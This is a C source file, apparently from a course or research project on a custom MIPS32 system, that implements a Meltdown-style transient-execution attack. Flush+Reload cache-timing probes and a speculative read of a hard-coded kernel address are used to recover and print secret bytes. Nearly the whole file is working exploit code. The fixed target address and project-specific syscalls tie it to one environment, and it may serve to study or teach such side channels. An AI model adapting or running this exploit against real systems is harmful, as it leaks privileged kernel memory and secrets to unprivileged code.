#include <mips/mips32.h>
#include <string.h>
#include "lib.h"
#include "timer.h"

#include "meltdown.h"

/*********************** Flush + Reload ************************/
u8 array[256 * 4096];


void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i * 4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) syscall_rt_mm_clflush(&array[i * 4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile u8 *addr;
  register u8 time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = get_TLR0();
    junk = *addr;
    time2 = get_TLR0() - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
  char kernel_data = 0;

  // Give return value register something to do
    asm volatile(
        "addi $t0, $zero, 141  # 将 $t0 赋值为 141\n"
        "add $v0, $v0, $t0     # 将 $v0 加上 $t0 的值\n"
        "li $t1, 800            # 将 $t1 赋值为 800\n"
        "loop:                 # 标签 loop\n"
        "    add $v0, $v0, $t0     # 再次将 $v0 加上 $t0 的值\n"
        "    addi $t1, $t1, -1     # 将 $t1 减 1\n"
        "    bne $t1, $zero, loop  # 如果 $t1 不为 0，则跳转到 loop 标签处\n"
    );

  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;
  array[kernel_data * 4096 + DELTA] += 1;
}

// signal handler
/*
static sigjmp_buf jbuf;
static void catch_segv()
{
  siglongjmp(jbuf, 1);
}
*/

int dummy_func() {
    volatile int a = 0, b = 114514;
    while(b--) { a += 2; }
    return a % 2;
}

void do_meltdown()
{
  for (int idx = 0; idx < 8; ++idx) {
    int i, j, ret = 0;

    // Register signal handler
    //signal(SIGSEGV, catch_segv);

/*
    int fd = open("/proc/secret_data", O_RDONLY);
    if (fd < 0) {
      perror("open");
      return -1;
    }
*/
    memset(scores, 0, sizeof(scores));
    flushSideChannel();


    // Retry 1000 times on the same address.
    for (i = 0; i < 1000; i++) {
        /*
      ret = pread(fd, NULL, 0, 0);
      if (ret < 0) {
        perror("pread");
        break;
      }
        */
      // Flush the probing array
      for (j = 0; j < 256; j++)
        syscall_rt_mm_clflush(&array[j * 4096 + DELTA]);

      // if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xf9d8b000 + idx); }
        if (dummy_func() == 0) { meltdown_asm(0xf9d8b000 + idx); }

      reloadSideChannelImproved();
    }

    // Find the index with the highest score.
    int max = 0;
    for (i = 0; i < 256; i++) {
      if (scores[max] < scores[i]) max = i;
    }
    printf("Position of stolen byte is %d \n", idx);
    printf("The secret value is %d %c\n", max, max);
    printf("The number of hits is %d\n\n", scores[max]);

  }

}